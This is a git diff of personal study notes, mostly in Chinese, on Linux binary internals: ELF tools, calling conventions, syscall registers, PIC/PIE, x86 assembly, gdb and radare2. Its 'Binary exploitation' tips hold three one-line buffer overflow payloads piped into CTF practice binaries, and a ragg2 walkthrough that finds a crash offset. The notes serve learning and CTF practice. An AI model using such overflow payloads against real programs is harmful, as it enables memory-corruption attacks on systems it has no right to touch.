@@ -28,6 +28,11 @@ contentCopyright: true
 * To retrieve relocation entries: `readelf -r <object>`
 * To retrieve a dynamic segment: `readelf -d <object>`
 
+## objdump
+> objdump -D -Mintel test
+## nm
+> nm  test  # list symbols from object files
+
 # little endian & big endian
 little endian： 9A9B9C9D   =>   (9D->0x1000, 9C->0x1001, 9B->0x1002, 9A->0x1003)
 big endian则相反，存储成 （9A->0x1000, 9B->0x1001, 9C->0x1002, 9D->0x1003)
@@ -53,7 +58,7 @@ foo(void) {
     bar(111,222);
 }
 ```
-foo被调用的时候，会把111，222存入到当前自己的stack frame，注意是从右到做入栈，所以他会做如下操作：
+foo被调用的时候，会把111，222存入到当前自己的stack frame，注意是从右到左入栈，所以他会做如下操作：
 
 ``` shell
 esp = 当前esp - 8
@@ -257,10 +262,55 @@ main:
 
 char * 指针64bit
 
-# PIE / PIC[^3][^4][^5]
-在我的archlinux上（2018年12月的更新），gcc默认启用了pic和pie，会导致加载地址随机：
+# register
+ESP is the current stack pointer. EBP is the base pointer for the current stack frame.
 
-PIC全名Postion Independent Codes，实现共享库的加载地址不固定，地址需要loader在加载时确定。
+When you call a function, typically space is reserved on the stack for local variables. This space is usually referenced via EBP (all local variables and function parameters are a known constant offset from this register for the duration of the function call.); ESP, on the other hand, will change during the function call as other functions are called, or as temporary stack space is used for partial operation results.
+
+Note that most compilers these days have an option to reference all local variables through ESP. This frees up EBP for use as a general purpose register.
+
+In general, when you look at the disassembly code at the top of a function you'll see something like this:
+
+push EBP
+mov  EBP, ESP
+sub  ESP, <some_number>
+So EBP will point to the top of your stack for this frame, and ESP will point to the next available byte on the stack. (Stacks usually - but don't have to - grow down in memory.)
+
+# CDECL (C declaration) / SysV
+caller把参数从又到左入栈(push arg3; push arg2, push arg1)，callee保存caller的ebp到栈中(push ebp)，设置自己的ebp为当前esp（mov ebp, esp），然后入栈自己的local variable和其他, 所以，对于callee来说，第一个参数就是（ebp+4）。
+
+In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit
+For 64-bit binaries, function arguments are first passed in certain registers:RDI/RSI/RDX/RCX/R8/R9, then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.
+
+# syscall
+参考man syscall，里面syscall需要用到的register，eax/rax里面存中断号，eax/rax和edx/rdx里面存返回值，前六个参数在register，后面参数入栈
+
+``` shell
+Arch/ABI    Instruction           System  Ret  Ret  Error    Notes
+                                   call #  val  val2
+───────────────────────────────────────────────────────────────────
+i386        int $0x80             eax     eax  edx  -
+x86-64      syscall               rax     rax  rdx  -        5
+
+Arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
+──────────────────────────────────────────────────────────────
+i386          ebx   ecx   edx   esi   edi   ebp   -
+x86-64        rdi   rsi   rdx   r10   r8    r9    -
+```
+
+
+
+# PIC / PIE[^3][^4][^5]
+当linker在生成共享库的时候，由于共享库的加载位置不固定（共享库在运行程序地址空间中的位置需要在库加载时确定），共享库内部的引用（变量或功能）无法硬编码指向正确的地址（数据操作，例如move需要绝对地址；功能调用call需要相对地址，相对call的下一条指令）。他们需要Dynamic loader(man ld.so)在加载类库的时候更新这些引用，用正确的地址替换。
+
+在linux elf共享库，有两种实现方式：
+* load-time relocation
+* PIC (Postion Independent Codes)
+
+目前pic是主流的方式。
+
+load-time relocation的缺点明显：首先，由于同一类库在不同运行程序地址空间中的位置不固定
+
 
 PIE是指Position Independent Executables, 实现可执行文件的加载地址不固定（没有PIE之前，可执行文件默认会从固定地址加载，例如0x400000作为base加载地址[^6]）。
 ```
@@ -448,6 +498,132 @@ value at 0xc892303c
 # readelf
 elf格式工具，可以用来查看elf文件信息，例如segment，header，relocs等
 
+# asm
+
+``` shell
+mov [ebx], eax                # move the value in EAX, to the memory address contained in EBX.
+
+mov ebx, [eax]                # move the value from the memory address contained in EAX to EBX.
+
+mov eax,DWORD PTR [eax+0x4]   # EAX=0xfffffd1a0 / 0xffffd1a4 --> 0xffffd234 --> 0xffffd3d6 ("/home/tacy/workspace/binary-study/say_hi")
+                              # EAX+4 = 0xffffd1a4, move 0xffffd234 to eax
+
+lea eax,DWORD PTR [eax+0x4]   # EAX=0xfffffd1a0 / 0xffffd1a4 --> 0xffffd234 --> 0xffffd3d6 ("/home/tacy/workspace/binary-study/say_hi")
+                              # EAX+4 = 0xffffd1a4, move 0xffffd1a4 to eax
+
+and esp,0xfffffff0            # In modern processors, we know that GCC aligns the stack defaulting to 16-byte alignment.
+                              # 16 byte ( 128 bit ) is because of SSE2 instructions which have MMX and XMM registers and XMM registers are of 128 bit.
+
+x/s $ebx                      # display the value from the memory address contained in EBX
+
+p *$ebx                       # display the value from the memory address contained in EBX
+
+x/s **0xffffd1a4              # display the value from the address
+x/64bc chararray               # display char[64] array
+
+x/s **((char ***)($esp+0x8))  # ESP: 0xffffd19c / 0xffffd1a4 --> 0xffffd234 --> 0xffffd3d6 ("/home/tacy/workspace/binary-study/say_hi")
+x/s **((char ***)($esp+8)+1)  # Print next
+
+```
+## leave & ret[^7]
+leave:
+``` shell
+mov   %ebp, %esp     # esp = ebp,  mov  esp,ebp in Intel syntax
+pop   %ebp
+```
+
+ret:
+call会把call指令后面的一条指令的地址压入栈，ret就是把这个地址弹出到EIP，例如：
+
+``` shell
+=>0x80491c0 <main+46>: call   0x8049176 <say_hi>
+  0x80491c5 <main+51>: add    esp,0x10
+```
+call会把0x80491c5压入栈，然后跳转到0x8049176，执行say_hi
+
+## Binary exploitation
+### ROP(Return Oriented Programming)[^8]
+### tips
+echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaa'
+echo -n `python -c "print '0'*40+'\xef\xbe\xad\xde'"` | ./ch13
+cat <(python -c "print 'A'*128+'\x16\x85\x04\x08\x0a\x0a'") -| ./ch15
+
+# Radare2
+## r2
+### i
+显示binary信息，具体可以查看`i?`，`ia`查看所有信息，
+
+### d
+> dcu main/address: stands for debug continue until main/address
+在搜索的时候，你需要先运行程序到entry0，这样才会加载共享类库，否则你可能无法搜索共享库，例如libc
+> dm  /  dm=  (ASCII-art bar)
+打印当前程序的内存map
+> dmm
+Using dmm we can "List modules (libraries, binaries loaded in memory)", this is quite a handy command to see which modules were loaded.
+> dmi <lib_name> symbol_name
+查看共享类库symbol的加载地址
+> drr
+Show registers references (telescoping) (like peda)
+> px/?  or  x/
+类似gdb的x命令
+
+
+### aaa/A & aaaa/AA (analysis)
+分析binary文件，pdc/pdd/pdf之类的指令才能使用
+
+### Visual Graph
+可以通过VV进入调用图模式（需要先用aaa分析）
+#### panel
+panel替换用`"`, 同一panel，不同展现形式可以通过`i`切换
+
+#### call跳转
+function之间调整可以通过快捷字符，例如：
+`call sys.imp.puts; [oa]`
+这里你可以通过`oa`跳转到puts，返回用`u`键
+
+#### function switch
+通过`F`键实现切换，例如要从functionA切换到functionB，直接`F`->选择symbols->选择functionB
+
+### 反编译
+There is a huge difference between pdc and pdd (r2dec).
+* pdc provide a basic r2 pseudo code with some and it's mostly for x86/x64.
+* pdd provides a more advance pseudo-C like code where the controlflow, instructions, delayed branches, etc.. have been analyzed and tries to provide some slightly more readable code to the user.
+pdd is only available after installing r2dec from r2pm.
+
+## ragg2[^9]
+可以做溢出字符计算，很简单就可以实现
+
+``` shell
+$ ragg2 -P 200 -r > pattern.txt
+$ cat pattern.txt
+AAABAACAADAAEAAFAAGAAHAAI… <truncated> …7AA8AA9AA0ABBABCABDABEABFA
+
+$ vim profile.rr2
+
+$ cat profile.rr2
+#!/usr/bin/rarun2
+stdin=./pattern.txt
+
+$ r2 -r profile.rr2 -d megabeets_0x2
+Process with PID 21663 started…
+= attach 21663 21663
+bin.baddr 0x08048000
+Using 0x8048000
+Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
+asm.bits 32
+
+— Use rarun2 to launch your programs with a predefined environment.
+[0xf77c2b30]> dc
+Selecting and continuing: 21663
+
+.:: Megabeets ::.
+
+Show me what you got?
+child stopped with signal 11
+
+[0x41417641]>wopO 0x41417641
+140
+```
 
 # gcc
 
@@ -477,3 +653,9 @@ gcc -shared -no-pie -o libsimple.so simple.o  # no-pie必须在shared后面
 [^5]: [Position Independent Code (PIC) in shared libraries on x64](https://eli.thegreenplace.net/2011/11/11/position-independent-code-pic-in-shared-libraries-on-x64)
 
 [^6]: [Why is 0x00400000 the default base address for an executable?](https://blogs.msdn.microsoft.com/oldnewthing/20141003-00/?p=43923)
+
+[^7]: [what is the stack](https://ctf101.org/binary-exploitation/what-is-the-stack/)
+
+[^8]: [Return Oriented Programming](https://ctf101.org/binary-exploitation/return-oriented-programming/)
+
+[^9]: [A journey into Radare 2 – Part 2: Exploitation](https://www.megabeets.net/a-journey-into-radare-2-part-2/)
